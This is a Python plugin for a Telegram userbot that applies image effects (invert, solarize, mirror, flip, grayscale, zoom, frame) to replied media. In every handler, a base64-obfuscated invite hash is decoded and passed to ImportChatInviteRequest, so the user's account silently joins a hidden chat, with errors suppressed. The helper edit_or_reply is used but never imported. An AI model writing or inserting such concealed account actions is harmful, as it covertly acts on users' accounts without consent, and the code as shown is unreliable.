import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from AuraXBot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as AuraXBot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@AuraXBot.on(admin_cmd(pattern="invert$", outgoing=True))
@AuraXBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
        aura = True
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await AuraX.client.send_file(
        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
    )
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@AuraXBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@AuraXBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
        aura = True
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await AuraX.client.send_file(
        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
    )
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@AuraXBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@AuraXBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
        aura = True
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await AuraX.client.send_file(
        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
    )
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@AuraXBot.on(admin_cmd(outgoing=True, pattern="flip$"))
@AuraXBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
        aura = True
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await AuraX.client.send_file(
        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
    )
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@AuraXBot.on(admin_cmd(outgoing=True, pattern="gray$"))
@AuraXBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
        aura = True
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await AuraX.client.send_file(
        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
    )
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@AuraXBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@AuraXBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXinput = AuraX.pattern_match.group(1)
    AuraXinput = 50 if not AuraXinput else int(AuraXinput)
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, AuraXinput)
    except Exception as e:
        return await AuraX.edit(f"`{e}`")
    try:
        await AuraX.client.send_file(
            AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
        )
    except Exception as e:
        return await AuraX.edit(f"`{e}`")
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@AuraXBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@AuraXBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(AuraX):
    if AuraX.fwd_from:
        return
    reply = await AuraX.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(AuraX, "`Reply to supported Media...`")
        return
    AuraXinput = AuraX.pattern_match.group(1)
    if not AuraXinput:
        AuraXinput = 50
    if ";" in str(AuraXinput):
        AuraXinput, colr = AuraXinput.split(";", 1)
    else:
        colr = 0
    AuraXinput = int(AuraXinput)
    colr = int(colr)
    AuraXid = AuraX.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    AuraXsticker = await reply.download_media(file="./temp/")
    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(AuraXsticker)
        await edit_or_reply(AuraX, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if AuraXsticker.endswith(".tgs"):
        await AuraX.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        AuraXfile = os.path.join("./temp/", "meme.png")
        AuraXcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
        )
        stdout, stderr = (await runcmd(AuraXcmd))[:2]
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith(".webp"):
        await AuraX.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        os.rename(AuraXsticker, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("`Template not found... `")
            return
        meme_file = AuraXfile
        aura = True
    elif AuraXsticker.endswith((".mp4", ".mov")):
        await AuraX.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        AuraXfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(AuraXsticker, 0, AuraXfile)
        if not os.path.lexists(AuraXfile):
            await AuraX.edit("```Template not found...```")
            return
        meme_file = AuraXfile
    else:
        await AuraX.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = AuraXsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await AuraX.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, AuraXinput, colr)
    except Exception as e:
        return await AuraX.edit(f"`{e}`")
    try:
        await AuraX.client.send_file(
            AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
        )
    except Exception as e:
        return await AuraX.edit(f"`{e}`")
    await AuraX.delete()
    os.remove(outputfile)
    for files in (AuraXsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()